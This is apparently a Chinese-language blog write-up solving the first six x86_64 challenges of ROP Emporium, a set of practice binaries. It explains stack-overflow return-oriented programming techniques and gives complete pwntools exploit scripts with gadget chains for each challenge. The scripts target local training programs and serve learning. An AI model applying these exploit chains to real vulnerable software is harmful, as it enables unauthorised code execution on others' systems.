---
title: ROP Emporium x86_64 1~6题
date: 2023-02-28 22:45:10
categories:
- write-ups
- 其他
---
ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。

[ROP Emporium](https://ropemporium.com/index.html)

# 1. ret2win

这个没什么好说的，新手第一题水平，直接改返回地址就行。

payload:

```python
from pwn import *

io = process('./ret2win')

io.sendlineafter(b'> ', cyclic(40) + p64(0x400756))

io.interactive()
```

# 2. split

这道题需要调用system函数，传入正确的参数。参数在数据段已经给出，直接使用经典gadget将参数pop到rdi寄存器中即可。rdi是64位linux程序函数的第一个参数，前6个参数分别为：rdi, rsi, rdx, rcx, r8, r9，之后的参数在栈中高地址处依次保存。

payload:

```python
from pwn import *

context.arch = 'amd64'

io = process('./split')

useful_string = 0x601060
pop_rdi_ret_addr = 0x4007c3
elf = ELF('./split')

payload = cyclic(32 + 8) + p64(pop_rdi_ret_addr) + p64(useful_string) + p64(elf.plt['system'])

io.sendlineafter(b'> ', payload)

io.interactive()
```

# 3. callme

这道题需要调用自定义库中的三个函数，这3个函数首先都对传入的前三个参数进行了检查。我们只需要在ROP里面将参数传进去即可。

payload:

```python
from pwn import *

io = process('./callme')
elf = ELF('./callme')

rdi = 0x4009a3
rsirdx = 0x40093d

payload = cyclic(32 + 8)
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(rsirdx) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(elf.plt['callme_one'])
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(rsirdx) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(elf.plt['callme_two'])
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(rsirdx) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(elf.plt['callme_three'])

io.sendlineafter(b'> ', payload)
io.interactive()
```

# 4. write4

这一题虽然有一个print_file函数，但是对应的参数在write4文件中没有给出，需要我们自己构造。仔细使用IDA观察会发现，程序特地给了我们一个gadget实现任意地址写。bss段或data段能够作为我们构造的字符串'flag.txt'的存放位置，那么我们就将这个字符串写到这些可写段中，再将其作为参数传入print_file函数即可。

payload:

```python
from pwn import *
context.log_level='debug'

io = process('./write4')
elf = ELF('./write4')
useful_gadget = 0x400628
r14r15 = 0x400690
rdi = 0x400693
write_addr = 0x601028
main_addr = 0x400607

payload = cyclic(32 + 8)
payload += p64(r14r15) + p64(write_addr) + b'flag.txt'
payload += p64(useful_gadget)
payload += p64(r14r15) + p64(write_addr + 8) + p64(0)
payload += p64(useful_gadget)
payload += p64(rdi) + p64(write_addr)
payload += p64(elf.plt['print_file'])

io.sendlineafter(b'> ', payload)

io.interactive()
```

# 5. badchars

这道题的pwnme函数中添加了一个检查，不允许出现'x'、'a'、'g'、'.'这4个字符。但是程序中给出了任一地址加减的gadget，我们先写入其他值，然后通过加减将这个值变成我们想要的值就可以了。但是这里需要注意一点：如果在data段的开头——0x601028写入，程序会崩溃。因为我们需要绕过'x'字符，就势必在应该写入x的地方一开始不能写入x。如果在此处写字符串，那么字符'x'的位置应该在0x60102E，但是 **2E正好是'.'的ASCII码，会被强制转换，从而导致ROP失败。** 不过我们还是可以在0x601030写入。

这里提供一个ROP调试的省时小技巧。当我们构造的ROP多次失败时，如果这个ROP是一次注入，那么我们是无法进行调试的。这种情况下我们可以在ROP中间插入一个有反馈的代码段地址，如main函数开头。我们将这个main函数开头插入到ROP的不同位置，从前往后查找，前面的ROP如果正常执行，那么我们可以及时地得到反馈，如果错误则会崩溃，我们就会知道哪一步ROP之前出了错误。如此从前往后，我们就可以找到，到底是哪一步ROP有问题，从而进行修改。

payload:

```python
from pwn import *
context.log_level = 'debug'

io = process('./badchars')
elf = ELF('./badchars')

xor_r14r15 = 0x400628
add_r14r15 = 0x40062c
sub_r14r15 = 0x400630
mov_r12r13 = 0x400634
pop_r12r13r14r15 = 0x40069c
pop_r14r15 = 0x4006a0
pop_rdi = 0x4006a3
write_addr = 0x601030

badchars = 'xga.'

payload = b'b' * 40
payload += p64(pop_r12r13r14r15) + b'flbh/tyt' + p64(write_addr) + p64(1) + p64(write_addr + 2)		# a->b g->h .->/ x->y then just -1
payload += p64(mov_r12r13)
payload += p64(sub_r14r15)
payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)
payload += p64(sub_r14r15)
payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)
payload += p64(sub_r14r15)
payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)
payload += p64(sub_r14r15)
payload += p64(pop_rdi) + p64(write_addr)
payload += p64(elf.plt['print_file'])

io.sendlineafter(b'> ', payload)

io.interactive()
```

# 6. fluff

这题和上题唯一的区别就是给的gadget不同。但是这个gadget可谓是花里胡哨。3个指令都不熟悉。查！

```
.text:0000000000400628 ; ---------------------------------------------------------------------------
.text:0000000000400628
.text:0000000000400628 questionableGadgets:
.text:0000000000400628                 xlat
.text:0000000000400629                 retn
.text:000000000040062A ; ---------------------------------------------------------------------------
.text:000000000040062A                 pop     rdx
.text:000000000040062B                 pop     rcx
.text:000000000040062C                 add     rcx, 3EF2h
.text:0000000000400633                 bextr   rbx, rcx, rdx
.text:0000000000400638                 retn
.text:0000000000400639 ; ---------------------------------------------------------------------------
.text:0000000000400639                 stosb
.text:000000000040063A                 retn
.text:000000000040063A ; ---------------------------------------------------------------------------
```

xlat指令：将[rbx+al]的值赋值给al，这里的64位解析出来gdb显示为xlatb，赋值后rax高位不变。
bextr指令：byte extract。bextr dest src1 src2
``dest = (src1 >> (src2 & 0xFF)) & (1 << ((src2 >> 8) & 0xFF) - 1)``
即src2的次低字节表示提取bit位数，最低字节表示提取bit位起始处。将src1提取src2中指定的比特位并赋值到dest中。
例如本题中的 bextr rbx rcx rdx，设rcx = 0b10101100 01011101 00010001 11100111，rdx = 0x0509，则提取：
```
									 98 76543210
	rcx = 0b 10101100 01011101 00010001 11100111
								 [   ]
	rbx = 0x8
```
stosb指令：将al赋值给[rdi]

通过上述3个指令，我们需要怎样构造flag.txt字符串呢？

注意到，能够将寄存器的值赋值到内存中的只有stosb指令，在__libc_csu_init函数中有pop rdi; ret的gadget，我们因此可以控制stosb指令将al的值写到哪里。接下来就需要思考如何将正确的值写入al中了。正好xlat指令提供了解决方案，可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样，整个利用的流程也就清晰了。修改rbx -> 修改al -> 修改内存。

在pwnme函数返回时，rax的值为0xb，是一个较小的值。我们可以在rbx中写入LOAD段中有一块全为0的起始地址，这样就能够将rax赋值为0，便于进行后续操作。

之后就是一个字符一个字符地转存到.bss段中即可。注意：stosb指令执行后rdi会自增，因此只需要写一个rdi赋值的gadget即可。

在赋值过程中，我们似乎可以在每赋值一个字节之后就将rax清零，然后精准定位下一个字节。但是构造完毕之后会发现，整个gadget的长度已经超过了写入的限制——0x200。因此我们需要利用上一个字节的值定位下一个字节的值。在一个字节写入完毕后，rax的值应该为这个字节对应的ASCII码，我们需要在rbx中再减去这个ASCII码值，一样可以定位到下一个字节的位置。同时要注意代码中对rcx本身加上了一个值，也要减去。

payload:

```python
from pwn import *
context.log_level = 'debug'

io = process('./fluff')
elf = ELF('./fluff')

xlat = 0x400628
bextr = 0x40062A
stosb = 0x400639
zero_seg = 0x600fa0			# \x00 in this place
write_addr = 0x601038
rdi = 0x4006A3
main_addr = 0x400607

# address of char 'f', 'l', 'a', 'g', '.', 't', 'x', 't'
# you can view the hex in window 'Hex View-1' in IDA_PRO to find the bytes you want 
char_addr = [0x4003C4, 0x4003C1, 0x4003D6, 0x4003CF, 0x4003C9, 0x4003D8, 0x400246, 0x4003D8]
# ASCII value of each byte
char = [ord(x) for x in 'flag.txt']

print(char)

payload = cyclic(40)
payload += p64(rdi) + p64(write_addr)			# make rdi point to address needed to write

# make 'f' into 0x601038
# gdb tell us that after gadget for rdi, rax should be 0xb, so we minus 0xb to make rax = 0
payload += p64(bextr) + p64(0x2000) + p64(zero_seg - 0x3EF2 - 0xb)		# start = 0, len = 0x20, equals mov rbx, rcx
payload += p64(xlat)
payload += p64(bextr) + p64(0x2000) + p64(char_addr[0] - 0x3EF2)
payload += p64(xlat)
payload += p64(stosb)

for i in range(7):
	payload += p64(bextr) + p64(0x2000) + p64(char_addr[i + 1] - char[i] - 0x3EF2)		# to get the right value
	payload += p64(xlat)
	payload += p64(stosb)

payload += p64(rdi) + p64(write_addr)

payload += p64(elf.plt['print_file'])

io.sendlineafter(b'> ', payload)
io.interactive()
```
